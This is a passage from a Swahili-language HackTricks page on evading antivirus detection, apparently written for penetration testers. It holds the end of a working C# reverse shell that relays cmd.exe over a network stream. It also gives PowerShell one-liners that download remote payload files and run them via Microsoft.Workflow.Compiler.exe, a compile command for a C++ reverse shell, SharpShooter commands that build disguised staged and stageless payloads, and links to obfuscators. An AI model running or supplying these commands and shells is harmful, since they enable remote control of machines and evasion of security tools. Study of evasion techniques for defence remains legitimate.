StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### Kutumia Kompaila ya C#

Kutumia kompaila ya C# ni njia moja ya kuepuka kugunduliwa na programu za antivirus (AV) wakati wa kutekeleza shughuli za udukuzi. Kwa kufanya hivyo, unaweza kubadilisha namna programu yako ya udukuzi inavyoonekana kwa AV.

Unapotumia kompaila ya C#, unachukua msimbo wako wa C# na kuubadilisha kuwa faili ya kutekelezwa (executable) ambayo inaweza kufanya kazi kama programu ya kawaida. Hii inaweza kusaidia kuepuka uchunguzi wa AV ambao unaweza kugundua faili za script au msimbo wa chanzo wa C#.

Kuna njia kadhaa za kufanya hivyo. Moja ya njia hizo ni kutumia msimbo wa C# kujenga faili ya kutekelezwa (executable) moja kwa moja. Njia nyingine ni kutumia kompaila ya C# kubadilisha faili ya script ya C# kuwa faili ya kutekelezwa.

Kwa kufanya hivyo, unaweza kuepuka uchunguzi wa AV na kuendelea na shughuli zako za udukuzi bila kugunduliwa. Hata hivyo, ni muhimu kukumbuka kwamba kutumia njia hii kunaweza kuwa kinyume cha sheria na inaweza kusababisha madhara makubwa. Kwa hivyo, ni muhimu kuzingatia sheria na kufanya udukuzi tu kwa idhini sahihi.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa moja kwa moja:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Orodha ya waficha C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Vifaa vingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
